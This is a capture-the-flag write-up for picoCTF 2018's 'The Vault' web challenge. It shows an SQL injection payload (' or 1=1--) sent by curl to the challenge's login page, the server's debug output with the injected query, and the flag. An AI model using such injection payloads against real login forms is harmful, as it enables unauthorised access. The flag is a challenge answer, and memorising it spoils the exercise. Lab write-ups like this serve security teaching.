# The Vault
Web Exploitation - 250 points

## Challenge 
> There is a website running at http://2018shell2.picoctf.com:64349. Try to see if you can login!


## Solution

Source code is provided on the website, [login.txt](login.txt)

Simple SQL injection using payload of `' or 1=1--`

	$ curl http://2018shell2.picoctf.com:64349/login.php --data "username=derp&password=' or 1=1--&debug=1"

	<pre>username: derp
	password: ' or 1=1--
	SQL query: SELECT 1 FROM users WHERE name='derp' AND password='' or 1=1--'
	</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}</p>


## Flag

	picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}